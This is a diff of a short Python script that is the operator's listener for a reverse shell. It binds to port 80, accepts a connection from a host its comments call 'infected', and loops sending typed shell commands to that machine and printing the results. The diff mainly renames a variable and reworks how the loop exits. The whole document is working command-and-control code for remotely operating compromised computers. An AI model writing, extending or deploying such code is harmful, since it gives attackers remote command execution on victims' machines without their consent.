@@ -1,6 +1,5 @@
 import socket
 
-
 Host = "0.0.0.0"  #Host listens on everything 
 Port = 80           #HTTP Port
 
@@ -9,8 +8,6 @@ Size = 1024 * 128  #Size of message
 message = "Thank You for Connecting!"
 
 b_mess = bytes(message, 'ascii')
-
-
 
 SEP = "<sep>"
 
@@ -27,26 +24,19 @@ infected, client_address = s.accept()       #Accepts connection from Infected an
 infected.send(b_mess) #Sends a message to infected. Not currently working. Pls convert to byte
 print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected
 
-cwd = infected.recv(Size).decode()#Decodes the message from Infector. Should be the pwd
-print("Current working directory: ",cwd)
+pwd = infected.recv(Size).decode()#Decodes the message from Infector. Should be the pwd
+print("Current working directory: ",pwd)
 
 
 while True:
 
-    command = input(f"{cwd} $> ")
-    if not command.strip():
-        continue
+    command = input(f"{pwd} $> ")
 
-    infected.send(command.encode()) 
-    if command.lower() == "exit":
+    if 'exit' in command :
+        s.close()
         break
+    else:
+        infected.send(command.encode())
+        print (infected.recv(Size).decode())
 
-    output = infected.recv(Size).decode()
-    results = output.split(SEP)
-
-
-    print(results)
-   
-    
-    infected.close() #Cuts connection
 
